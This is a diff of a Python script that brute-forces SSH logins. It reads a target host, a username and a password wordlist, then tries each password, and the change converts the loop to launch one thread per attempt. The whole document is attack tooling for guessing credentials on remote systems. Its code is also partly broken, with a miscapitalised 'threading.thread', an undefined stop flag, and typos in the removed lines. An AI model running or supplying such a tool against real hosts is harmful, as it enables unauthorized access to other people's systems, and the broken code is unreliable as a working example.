@@ -17,16 +17,6 @@ def ssh_connect(password,code= 0 ):
     print(termcolor.colored(('[-] Incorrect Password: ' + password) , 'red'))
     ssh.close
      
-  #except paramiko.AuthenticationException:
-   # code = 1
-    #print('[-] Incorrect Login: ' + password) 
-    
-     
-  except socket.error as e:
-    code = 2
-  
-  ssh.close()  
-  return code  
 
 host = input('[+] Target Address: ')
 username = input('[+] SSH Username: ')
@@ -37,22 +27,18 @@ if os.path.exists(input_file) == False:
   print("[!!] File/Path Doesn't Exist")
   sys.exit(1)
   
+  
+print('* * *  Starting Threading SSH Bruteforce On ' + host + 'With Account: ' + username + '* * *')  
+
+  
 with open(input_file, 'r') as file:
   for line in file.readlines():
+     if stop_flag == 1:
+        t.join()
+        exit()
      password = line.strip()
-     try:
-       response = ssh_connect(password)
-       if response == 0:
-         #print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green' ))
-         break  
-         
-       elif response == 1:
-         #print('[-] Incorrect Login: ' + password) 
-           
-       elif response == 2: 
-         print('[!!] Cant Connect') 
-         sys.exit(1)
-     except Eception as e:
-     pritn(e)    
-     pass
-         
+     t = threading.thread(target=ssh_connect,args=(password,))
+     t.start()
+     time.sleep(0.5)
+     
+  
